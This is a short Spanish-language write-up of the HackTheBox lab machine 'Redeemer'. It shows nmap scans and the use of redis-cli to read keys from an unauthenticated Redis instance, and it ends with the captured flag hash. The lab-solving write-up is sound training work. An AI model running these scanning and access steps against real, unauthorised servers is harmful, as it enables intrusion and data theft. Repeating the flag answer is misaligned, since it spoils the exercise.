---
titulo: "Redeemer"
descripcion: "Acceso a instancia Redis expuesta sin autenticación para extraer flag directamente de la base de datos en memoria."
fecha: 2026-06-04
dificultad: easy
herramientas: ["nmap", "redis-cli"]
categoria: htb
plataforma: HackTheBox
completado: true
---

## Reconocimiento

Fase 1 — descubrimiento de puertos:

```bash
nmap -vvv -p- --open -sS --min-rate 5000 -n -Pn 10.129.51.163
```

Fase 2 — detección de versiones y scripts sobre los puertos encontrados:

```bash
nmap -p6379 10.129.51.163 -sCV
```

Puerto abierto: **6379/tcp (Redis 5.0.7)**

## Foothold

Redis expuesto sin autenticación. Conexión directa con `redis-cli`:

```bash
redis-cli -h 10.129.51.163 -p 6379
```

Enumeración del servidor:

```bash
info
# Keyspace muestra: db0:keys=4
```

Listado de keys y extracción de flag:

```bash
KEYS *
# 1) "flag"
# 2) "stor"
# 3) "numb"
# 4) "temp"

GET flag
```

## Flags

| Flag | Hash |
|------|------|
| Root | `03e1d2b376c37ab3f5319922053953eb` |
